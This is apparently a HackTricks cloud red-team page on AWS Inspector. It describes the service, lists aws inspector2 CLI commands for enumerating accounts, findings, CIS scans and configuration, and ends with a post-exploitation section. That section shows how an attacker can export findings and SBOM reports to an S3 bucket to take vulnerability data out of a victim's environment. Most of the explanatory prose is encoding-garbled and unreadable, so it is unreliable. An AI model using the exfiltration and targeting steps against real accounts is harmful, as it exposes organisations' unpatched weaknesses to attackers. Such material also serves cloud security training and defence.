# AWS - Inspector Enum

## AWS - Inspector Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Inspector

Amazon InspectorëŠ” AWS í™˜ê²½ì˜ ë³´ì•ˆì„ ê°•í™”í•˜ê¸° ìœ„í•´ ì„¤ê³„ëœ ê³ ê¸‰ ìë™í™” ì·¨ì•½ì  ê´€ë¦¬ ì„œë¹„ìŠ¤ì…ë‹ˆë‹¤. ì´ ì„œë¹„ìŠ¤ëŠ” Amazon EC2 ì¸ìŠ¤í„´ìŠ¤, Amazon ECRì˜ ì»¨í…Œì´ë„ˆ ì´ë¯¸ì§€, Amazon ECS ë° AWS Lambda í•¨ìˆ˜ì— ëŒ€í•´ ì§€ì†ì ìœ¼ë¡œ ì·¨ì•½ì  ë° ì˜ë„í•˜ì§€ ì•Šì€ ë„¤íŠ¸ì›Œí¬ ë…¸ì¶œì„ ìŠ¤ìº”í•©ë‹ˆë‹¤. ê°•ë ¥í•œ ì·¨ì•½ì  ì •ë³´ ë°ì´í„°ë² ì´ìŠ¤ë¥¼ í™œìš©í•˜ì—¬ Amazon InspectorëŠ” ì‹¬ê°ë„ ìˆ˜ì¤€ ë° ìˆ˜ì • ê¶Œì¥ ì‚¬í•­ì„ í¬í•¨í•œ ìƒì„¸í•œ ê²°ê³¼ë¥¼ ì œê³µí•˜ì—¬ ì¡°ì§ì´ ë³´ì•ˆ ìœ„í—˜ì„ ì‚¬ì „ì— ì‹ë³„í•˜ê³  í•´ê²°í•  ìˆ˜ ìˆë„ë¡ ë•ìŠµë‹ˆë‹¤. ì´ í¬ê´„ì ì¸ ì ‘ê·¼ ë°©ì‹ì€ ë‹¤ì–‘í•œ AWS ì„œë¹„ìŠ¤ ì „ë°˜ì— ê±¸ì³ ê°•í™”ëœ ë³´ì•ˆ íƒœì„¸ë¥¼ ë³´ì¥í•˜ë©°, ê·œì • ì¤€ìˆ˜ ë° ìœ„í—˜ ê´€ë¦¬ì— ê¸°ì—¬í•©ë‹ˆë‹¤.

### Key elements

#### Findings

Amazon Inspectorì˜ FindingsëŠ” EC2 ì¸ìŠ¤í„´ìŠ¤, ECR ë¦¬í¬ì§€í† ë¦¬ ë˜ëŠ” Lambda í•¨ìˆ˜ì˜ ìŠ¤ìº” ì¤‘ ë°œê²¬ëœ ì·¨ì•½ì  ë° ë…¸ì¶œì— ëŒ€í•œ ìƒì„¸ ë³´ê³ ì„œì…ë‹ˆë‹¤. ìƒíƒœì— ë”°ë¼ FindingsëŠ” ë‹¤ìŒê³¼ ê°™ì´ ë¶„ë¥˜ë©ë‹ˆë‹¤:

* **Active**: Findingì´ ìˆ˜ì •ë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.
* **Closed**: Findingì´ ìˆ˜ì •ë˜ì—ˆìŠµë‹ˆë‹¤.
* **Suppressed**: í•˜ë‚˜ ì´ìƒì˜ **suppression rules**ë¡œ ì¸í•´ ì´ ìƒíƒœë¡œ í‘œì‹œëœ Findingì…ë‹ˆë‹¤.

FindingsëŠ” ë‹¤ìŒ ì„¸ ê°€ì§€ ìœ í˜•ìœ¼ë¡œë„ ë¶„ë¥˜ë©ë‹ˆë‹¤:

* **Package**: ì´ FindingsëŠ” ë¦¬ì†ŒìŠ¤ì— ì„¤ì¹˜ëœ ì†Œí”„íŠ¸ì›¨ì–´ íŒ¨í‚¤ì§€ì˜ ì·¨ì•½ì ê³¼ ê´€ë ¨ì´ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ì•Œë ¤ì§„ ë³´ì•ˆ ë¬¸ì œê°€ ìˆëŠ” ì˜¤ë˜ëœ ë¼ì´ë¸ŒëŸ¬ë¦¬ë‚˜ ì¢…ì†ì„±ì´ ìˆìŠµë‹ˆë‹¤.
* **Code**: ì´ ë²”ì£¼ëŠ” AWS ë¦¬ì†ŒìŠ¤ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ ì½”ë“œì—ì„œ ë°œê²¬ëœ ì·¨ì•½ì ì„ í¬í•¨í•©ë‹ˆë‹¤. ì¼ë°˜ì ì¸ ë¬¸ì œëŠ” ë³´ì•ˆ ìœ„ë°˜ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆëŠ” ì½”ë”© ì˜¤ë¥˜ ë˜ëŠ” ë¶ˆì•ˆì „í•œ ê´€í–‰ì…ë‹ˆë‹¤.
* **Network**: ë„¤íŠ¸ì›Œí¬ FindingsëŠ” ê³µê²©ìê°€ ì•…ìš©í•  ìˆ˜ ìˆëŠ” ë„¤íŠ¸ì›Œí¬ êµ¬ì„±ì˜ ì ì¬ì  ë…¸ì¶œì„ ì‹ë³„í•©ë‹ˆë‹¤. ì—¬ê¸°ì—ëŠ” ì—´ë¦° í¬íŠ¸, ë¶ˆì•ˆì „í•œ ë„¤íŠ¸ì›Œí¬ í”„ë¡œí† ì½œ ë° ì˜ëª» êµ¬ì„±ëœ ë³´ì•ˆ ê·¸ë£¹ì´ í¬í•¨ë©ë‹ˆë‹¤.

#### Filters and Suppression Rules

Amazon Inspectorì˜ í•„í„° ë° suppression rulesëŠ” Findingsë¥¼ ê´€ë¦¬í•˜ê³  ìš°ì„  ìˆœìœ„ë¥¼ ì§€ì •í•˜ëŠ” ë° ë„ì›€ì„ ì¤ë‹ˆë‹¤. í•„í„°ë¥¼ ì‚¬ìš©í•˜ë©´ ì‹¬ê°ë„ ë˜ëŠ” ë¦¬ì†ŒìŠ¤ ìœ í˜•ê³¼ ê°™ì€ íŠ¹ì • ê¸°ì¤€ì— ë”°ë¼ Findingsë¥¼ ì„¸ë¶„í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Suppression rulesëŠ” ë‚®ì€ ìœ„í—˜ìœ¼ë¡œ ê°„ì£¼ë˜ê±°ë‚˜ ì´ë¯¸ ì™„í™”ëœ íŠ¹ì • Findingsë¥¼ ì–µì œí•  ìˆ˜ ìˆê²Œ í•˜ì—¬ ë³´ì•ˆ ë³´ê³ ì„œì˜ ê³¼ë¶€í•˜ë¥¼ ë°©ì§€í•˜ê³  ë” ì¤‘ìš”í•œ ë¬¸ì œì— ì§‘ì¤‘í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤.

#### Software Bill of Materials (SBOM)

Amazon Inspectorì˜ Software Bill of Materials (SBOM)ëŠ” ì†Œí”„íŠ¸ì›¨ì–´ íŒ¨í‚¤ì§€ ë‚´ì˜ ëª¨ë“  êµ¬ì„± ìš”ì†Œ, ë¼ì´ë¸ŒëŸ¬ë¦¬ ë° ì¢…ì†ì„±ì„ ìì„¸íˆ ì„¤ëª…í•˜ëŠ” ë‚´ë³´ë‚¼ ìˆ˜ ìˆëŠ” ì¤‘ì²© ì¸ë²¤í† ë¦¬ ëª©ë¡ì…ë‹ˆë‹¤. SBOMì€ ì†Œí”„íŠ¸ì›¨ì–´ ê³µê¸‰ë§ì— ëŒ€í•œ íˆ¬ëª…ì„±ì„ ì œê³µí•˜ì—¬ ë” ë‚˜ì€ ì·¨ì•½ì  ê´€ë¦¬ ë° ê·œì • ì¤€ìˆ˜ë¥¼ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤. ì´ëŠ” ì˜¤í”ˆ ì†ŒìŠ¤ ë° íƒ€ì‚¬ ì†Œí”„íŠ¸ì›¨ì–´ êµ¬ì„± ìš”ì†Œì™€ ê´€ë ¨ëœ ìœ„í—˜ì„ ì‹ë³„í•˜ê³  ì™„í™”í•˜ëŠ” ë° ì¤‘ìš”í•©ë‹ˆë‹¤.

### Key features

#### Export findings

Amazon InspectorëŠ” Findingsë¥¼ Amazon S3 Buckets, Amazon EventBridge ë° AWS Security Hubë¡œ ë‚´ë³´ë‚¼ ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì„ ì œê³µí•˜ì—¬ íŠ¹ì • ë‚ ì§œì™€ ì‹œê°„ì— ì‹ë³„ëœ ì·¨ì•½ì  ë° ë…¸ì¶œì— ëŒ€í•œ ìƒì„¸ ë³´ê³ ì„œë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê¸°ëŠ¥ì€ CSV ë° JSONê³¼ ê°™ì€ ë‹¤ì–‘í•œ ì¶œë ¥ í˜•ì‹ì„ ì§€ì›í•˜ì—¬ ë‹¤ë¥¸ ë„êµ¬ ë° ì‹œìŠ¤í…œê³¼ì˜ í†µí•©ì„ ìš©ì´í•˜ê²Œ í•©ë‹ˆë‹¤. ë‚´ë³´ë‚´ê¸° ê¸°ëŠ¥ì€ ë³´ê³ ì„œì— í¬í•¨ëœ ë°ì´í„°ì˜ ì‚¬ìš©ì ì§€ì •ì„ í—ˆìš©í•˜ì—¬ ì‹¬ê°ë„, ë¦¬ì†ŒìŠ¤ ìœ í˜• ë˜ëŠ” ë‚ ì§œ ë²”ìœ„ì™€ ê°™ì€ íŠ¹ì • ê¸°ì¤€ì— ë”°ë¼ Findingsë¥¼ í•„í„°ë§í•˜ê³  ê¸°ë³¸ì ìœ¼ë¡œ í˜„ì¬ AWS ë¦¬ì „ì˜ ëª¨ë“  Active ìƒíƒœì˜ Findingsë¥¼ í¬í•¨í•©ë‹ˆë‹¤.

Findingsë¥¼ ë‚´ë³´ë‚¼ ë•Œ ë°ì´í„° ì•”í˜¸í™”ë¥¼ ìœ„í•´ Key Management Service (KMS) í‚¤ê°€ í•„ìš”í•©ë‹ˆë‹¤. KMS í‚¤ëŠ” ë‚´ë³´ë‚¸ Findingsê°€ ë¬´ë‹¨ ì•¡ì„¸ìŠ¤ë¡œë¶€í„° ë³´í˜¸ë˜ë„ë¡ í•˜ì—¬ ë¯¼ê°í•œ ì·¨ì•½ì  ì •ë³´ì— ëŒ€í•œ ì¶”ê°€ ë³´ì•ˆ ê³„ì¸µì„ ì œê³µí•©ë‹ˆë‹¤.

#### Amazon EC2 instances scanning

Amazon InspectorëŠ” Amazon EC2 ì¸ìŠ¤í„´ìŠ¤ì— ëŒ€í•œ ê°•ë ¥í•œ ìŠ¤ìº” ê¸°ëŠ¥ì„ ì œê³µí•˜ì—¬ ì·¨ì•½ì  ë° ë³´ì•ˆ ë¬¸ì œë¥¼ ê°ì§€í•©ë‹ˆë‹¤. InspectorëŠ” EC2 ì¸ìŠ¤í„´ìŠ¤ì—ì„œ ì¶”ì¶œí•œ ë©”íƒ€ë°ì´í„°ë¥¼ ë³´ì•ˆ ê¶Œê³ ì˜ ê·œì¹™ê³¼ ë¹„êµí•˜ì—¬ íŒ¨í‚¤ì§€ ì·¨ì•½ì  ë° ë„¤íŠ¸ì›Œí¬ ë„ë‹¬ ê°€ëŠ¥ì„± ë¬¸ì œë¥¼ ìƒì„±í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ìŠ¤ìº”ì€ ê³„ì •ì˜ **scan mode** ì„¤ì • êµ¬ì„±ì— ë”°ë¼ **agent-based** ë˜ëŠ” **agentless** ë°©ë²•ì„ í†µí•´ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* **Agent-Based**: AWS Systems Manager (SSM) ì—ì´ì „íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‹¬ì¸µ ìŠ¤ìº”ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤. ì´ ë°©ë²•ì€ ì¸ìŠ¤í„´ìŠ¤ì—ì„œ ì§ì ‘ ë°ì´í„° ìˆ˜ì§‘ ë° ë¶„ì„ì„ í¬ê´„ì ìœ¼ë¡œ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **Agentless**: ì¸ìŠ¤í„´ìŠ¤ì— ì—ì´ì „íŠ¸ë¥¼ ì„¤ì¹˜í•  í•„ìš”ê°€ ì—†ëŠ” ê²½ëŸ‰ ëŒ€ì•ˆì„ ì œê³µí•˜ë©°, EC2 ì¸ìŠ¤í„´ìŠ¤ì˜ ëª¨ë“  ë³¼ë¥¨ì— ëŒ€í•œ EBS ìŠ¤ëƒ…ìƒ·ì„ ìƒì„±í•˜ê³  ì·¨ì•½ì ì„ ì°¾ì€ í›„ ì‚­ì œí•©ë‹ˆë‹¤; ê¸°ì¡´ AWS ì¸í”„ë¼ë¥¼ í™œìš©í•˜ì—¬ ìŠ¤ìº”í•©ë‹ˆë‹¤.

ìŠ¤ìº” ëª¨ë“œëŠ” EC2 ìŠ¤ìº”ì„ ìˆ˜í–‰í•˜ëŠ” ë° ì‚¬ìš©í•  ë°©ë²•ì„ ê²°ì •í•©ë‹ˆë‹¤:

* **Agent-Based**: EC2 ì¸ìŠ¤í„´ìŠ¤ì— SSM ì—ì´ì „íŠ¸ë¥¼ ì„¤ì¹˜í•˜ì—¬ ì‹¬ì¸µ ê²€ì‚¬ë¥¼ ìˆ˜í–‰í•©ë‹ˆë‹¤.
* **Hybrid Scanning**: ì—ì´ì „íŠ¸ ê¸°ë°˜ ë° ì—ì´ì „íŠ¸ ì—†ëŠ” ë°©ë²•ì„ ê²°í•©í•˜ì—¬ ë²”ìœ„ë¥¼ ê·¹ëŒ€í™”í•˜ê³  ì„±ëŠ¥ ì˜í–¥ì„ ìµœì†Œí™”í•©ë‹ˆë‹¤. SSM ì—ì´ì „íŠ¸ê°€ ì„¤ì¹˜ëœ EC2 ì¸ìŠ¤í„´ìŠ¤ì—ì„œëŠ” Inspectorê°€ ì—ì´ì „íŠ¸ ê¸°ë°˜ ìŠ¤ìº”ì„ ìˆ˜í–‰í•˜ê³ , SSM ì—ì´ì „íŠ¸ê°€ ì—†ëŠ” ê²½ìš°ì—ëŠ” ì—ì´ì „íŠ¸ ì—†ëŠ” ìŠ¤ìº”ì´ ìˆ˜í–‰ë©ë‹ˆë‹¤.

ë˜ ë‹¤ë¥¸ ì¤‘ìš”í•œ ê¸°ëŠ¥ì€ EC2 Linux ì¸ìŠ¤í„´ìŠ¤ì— ëŒ€í•œ **deep inspection**ì…ë‹ˆë‹¤. ì´ ê¸°ëŠ¥ì€ EC2 Linux ì¸ìŠ¤í„´ìŠ¤ì˜ ì†Œí”„íŠ¸ì›¨ì–´ ë° êµ¬ì„±ì„ ì² ì €íˆ ë¶„ì„í•˜ì—¬ ìš´ì˜ ì²´ì œ ì·¨ì•½ì , ì• í”Œë¦¬ì¼€ì´ì…˜ ì·¨ì•½ì  ë° ì˜ëª»ëœ êµ¬ì„± ë“±ì„ í¬í•¨í•œ ìƒì„¸í•œ ì·¨ì•½ì  í‰ê°€ë¥¼ ì œê³µí•˜ì—¬ í¬ê´„ì ì¸ ë³´ì•ˆ í‰ê°€ë¥¼ ë³´ì¥í•©ë‹ˆë‹¤. ì´ëŠ” **custom paths** ë° ëª¨ë“  í•˜ìœ„ ë””ë ‰í„°ë¦¬ë¥¼ ê²€ì‚¬í•˜ì—¬ ë‹¬ì„±ë©ë‹ˆë‹¤. ê¸°ë³¸ì ìœ¼ë¡œ Amazon InspectorëŠ” ë‹¤ìŒì„ ìŠ¤ìº”í•˜ì§€ë§Œ, ê° íšŒì› ê³„ì •ì€ ìµœëŒ€ 5ê°œì˜ ì¶”ê°€ ì‚¬ìš©ì ì •ì˜ ê²½ë¡œë¥¼ ì •ì˜í•  ìˆ˜ ìˆìœ¼ë©°, ê° ìœ„ì„ëœ ê´€ë¦¬ìëŠ” ìµœëŒ€ 10ê°œë¥¼ ì •ì˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* `/usr/lib`
* `/usr/lib64`
* `/usr/local/lib`
* `/usr/local/lib64`

#### Amazon ECR container images scanning

Amazon InspectorëŠ” Amazon Elastic Container Registry (ECR) ì»¨í…Œì´ë„ˆ ì´ë¯¸ì§€ì— ëŒ€í•œ ê°•ë ¥í•œ ìŠ¤ìº” ê¸°ëŠ¥ì„ ì œê³µí•˜ì—¬ íŒ¨í‚¤ì§€ ì·¨ì•½ì ì„ íš¨ìœ¨ì ìœ¼ë¡œ ê°ì§€í•˜ê³  ê´€ë¦¬í•©ë‹ˆë‹¤.

* **Basic Scanning**: ì´ëŠ” ì»¨í…Œì´ë„ˆ ì´ë¯¸ì§€ì—ì„œ ì•Œë ¤ì§„ OS íŒ¨í‚¤ì§€ ì·¨ì•½ì ì„ ì‹ë³„í•˜ëŠ” ë¹ ë¥´ê³  ê²½ëŸ‰ì˜ ìŠ¤ìº”ìœ¼ë¡œ, ì˜¤í”ˆ ì†ŒìŠ¤ Clair í”„ë¡œì íŠ¸ì˜ í‘œì¤€ ê·œì¹™ ì„¸íŠ¸ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ ìŠ¤ìº” êµ¬ì„±ìœ¼ë¡œ ë¦¬í¬ì§€í† ë¦¬ëŠ” í‘¸ì‹œ ì‹œ ë˜ëŠ” ìˆ˜ë™ ìŠ¤ìº”ì„ ìˆ˜í–‰í•  ë•Œ ìŠ¤ìº”ë©ë‹ˆë‹¤.
* **Enhanced Scanning**: ì´ ì˜µì…˜ì€ í‘¸ì‹œ ìŠ¤ìº” ì™¸ì— ì§€ì†ì ì¸ ìŠ¤ìº” ê¸°ëŠ¥ì„ ì¶”ê°€í•©ë‹ˆë‹¤. Enhanced scanningì€ ê° ì»¨í…Œì´ë„ˆ ì´ë¯¸ì§€ì˜ ë ˆì´ì–´ë¥¼ ë” ê¹Šì´ ë¶„ì„í•˜ì—¬ OS íŒ¨í‚¤ì§€ ë° í”„ë¡œê·¸ë˜ë° ì–¸ì–´ íŒ¨í‚¤ì§€ì˜ ì·¨ì•½ì ì„ ë” ë†’ì€ ì •í™•ë„ë¡œ ì‹ë³„í•©ë‹ˆë‹¤. ê¸°ë³¸ ì´ë¯¸ì§€ì™€ ì¶”ê°€ ë ˆì´ì–´ë¥¼ ëª¨ë‘ ë¶„ì„í•˜ì—¬ ì ì¬ì ì¸ ë³´ì•ˆ ë¬¸ì œì— ëŒ€í•œ í¬ê´„ì ì¸ ë·°ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

#### Amazon Lambda functions scanning

Amazon InspectorëŠ” AWS Lambda í•¨ìˆ˜ ë° ê·¸ ë ˆì´ì–´ì— ëŒ€í•œ í¬ê´„ì ì¸ ìŠ¤ìº” ê¸°ëŠ¥ì„ í¬í•¨í•˜ì—¬ ì„œë²„ë¦¬ìŠ¤ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë³´ì•ˆ ë° ë¬´ê²°ì„±ì„ ë³´ì¥í•©ë‹ˆë‹¤. InspectorëŠ” Lambda í•¨ìˆ˜ì— ëŒ€í•´ ë‘ ê°€ì§€ ìœ í˜•ì˜ ìŠ¤ìº”ì„ ì œê³µí•©ë‹ˆë‹¤:

* **Lambda standard scanning**: ì´ ê¸°ë³¸ ê¸°ëŠ¥ì€ Lambda í•¨ìˆ˜ ë° ë ˆì´ì–´ì— ì¶”ê°€ëœ ì• í”Œë¦¬ì¼€ì´ì…˜ íŒ¨í‚¤ì§€ ì¢…ì†ì„±ì˜ ì†Œí”„íŠ¸ì›¨ì–´ ì·¨ì•½ì ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, í•¨ìˆ˜ê°€ ì•Œë ¤ì§„ ì·¨ì•½ì ì´ ìˆëŠ” python-jwt ë¼ì´ë¸ŒëŸ¬ë¦¬ ë²„ì „ì„ ì‚¬ìš©í•˜ëŠ” ê²½ìš° Findingì„ ìƒì„±í•©ë‹ˆë‹¤.
* **Lambda code scanning**: ì‚¬ìš©ì ì •ì˜ ì• í”Œë¦¬ì¼€ì´ì…˜ ì½”ë“œì˜ ë³´ì•ˆ ë¬¸ì œë¥¼ ë¶„ì„í•˜ì—¬ ì£¼ì… ê²°í•¨, ë°ì´í„° ìœ ì¶œ, ì•½í•œ ì•”í˜¸í™” ë° ëˆ„ë½ëœ ì•”í˜¸í™”ì™€ ê°™ì€ ì·¨ì•½ì ì„ ê°ì§€í•©ë‹ˆë‹¤. ë°œê²¬ëœ ì·¨ì•½ì ì„ ê°•ì¡°í•˜ëŠ” ì½”ë“œ ìŠ¤ë‹ˆí«ì„ ìº¡ì²˜í•©ë‹ˆë‹¤. Findingsì—ëŠ” ë¬¸ì œë¥¼ í•´ê²°í•˜ê¸° ìœ„í•œ ìƒì„¸í•œ ìˆ˜ì • ì œì•ˆ ë° ì½”ë“œ ìŠ¤ë‹ˆí«ì´ í¬í•¨ë©ë‹ˆë‹¤.

#### **Center for Internet Security (CIS) scans**

Amazon InspectorëŠ” Amazon EC2 ì¸ìŠ¤í„´ìŠ¤ ìš´ì˜ ì²´ì œë¥¼ Center for Internet Security (CIS)ì˜ ëª¨ë²” ì‚¬ë¡€ ê¶Œì¥ ì‚¬í•­ê³¼ ë¹„êµí•˜ê¸° ìœ„í•´ CIS ìŠ¤ìº”ì„ í¬í•¨í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ìŠ¤ìº”ì€ êµ¬ì„±ì´ ì—…ê³„ í‘œì¤€ ë³´ì•ˆ ê¸°ì¤€ì„ ì¤€ìˆ˜í•˜ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.

* **Configuration**: CIS ìŠ¤ìº”ì€ ì‹œìŠ¤í…œ êµ¬ì„±ì´ íŠ¹ì • CIS Benchmark ê¶Œì¥ ì‚¬í•­ì„ ì¶©ì¡±í•˜ëŠ”ì§€ í‰ê°€í•˜ë©°, ê° ê²€ì‚¬ëŠ” CIS ì²´í¬ ID ë° ì œëª©ì— ì—°ê²°ë©ë‹ˆë‹¤.
* **Execution**: ìŠ¤ìº”ì€ ì¸ìŠ¤í„´ìŠ¤ íƒœê·¸ ë° ì •ì˜ëœ ì¼ì •ì— ë”°ë¼ ìˆ˜í–‰ë˜ê±°ë‚˜ ì˜ˆì•½ë©ë‹ˆë‹¤.
* **Results**: ìŠ¤ìº” í›„ ê²°ê³¼ëŠ” ì–´ë–¤ ì²´í¬ê°€ í†µê³¼, ê±´ë„ˆë›°ê¸° ë˜ëŠ” ì‹¤íŒ¨í–ˆëŠ”ì§€ ë‚˜íƒ€ë‚´ì–´ ê° ì¸ìŠ¤í„´ìŠ¤ì˜ ë³´ì•ˆ íƒœì„¸ì— ëŒ€í•œ í†µì°°ë ¥ì„ ì œê³µí•©ë‹ˆë‹¤.

### Enumeration
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
### Post Exploitation

{% hint style="success" %}
ê³µê²©ìì˜ ê´€ì ì—ì„œ ì´ ì„œë¹„ìŠ¤ëŠ” ê³µê²©ìê°€ ë‹¤ë¥¸ ì¸ìŠ¤í„´ìŠ¤/ì»¨í…Œì´ë„ˆë¥¼ ì†ìƒì‹œí‚¤ëŠ” ë° ë„ì›€ì´ ë  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ê³¼ ë„¤íŠ¸ì›Œí¬ ë…¸ì¶œì„ ì°¾ëŠ” ë° ë„ì›€ì„ ì¤„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ ê³µê²©ìëŠ” í”¼í•´ìê°€ ì·¨ì•½ì ì„ ë³¼ ìˆ˜ ì—†ë„ë¡ ì´ ì„œë¹„ìŠ¤ë¥¼ ë°©í•´í•˜ëŠ” ë°ì—ë„ ê´€ì‹¬ì´ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤(ëª¨ë“  ì·¨ì•½ì  ë˜ëŠ” íŠ¹ì • ì·¨ì•½ì ).
{% endhint %}

#### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

ê³µê²©ìëŠ” ì·¨ì•½ì  ë˜ëŠ” ì†Œí”„íŠ¸ì›¨ì–´ ìì¬ ëª…ì„¸ì„œ(SBOM)ì— ëŒ€í•œ ìì„¸í•œ ë³´ê³ ì„œë¥¼ ìƒì„±í•˜ê³  ì´ë¥¼ AWS í™˜ê²½ì—ì„œ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì •ë³´ëŠ” íŠ¹ì • ì•½ì , êµ¬ì‹ ì†Œí”„íŠ¸ì›¨ì–´ ë˜ëŠ” ì•ˆì „í•˜ì§€ ì•Šì€ ì¢…ì†ì„±ì„ ì‹ë³„í•˜ëŠ” ë° ì•…ìš©ë  ìˆ˜ ìˆìœ¼ë©°, í‘œì  ê³µê²©ì„ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤.
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
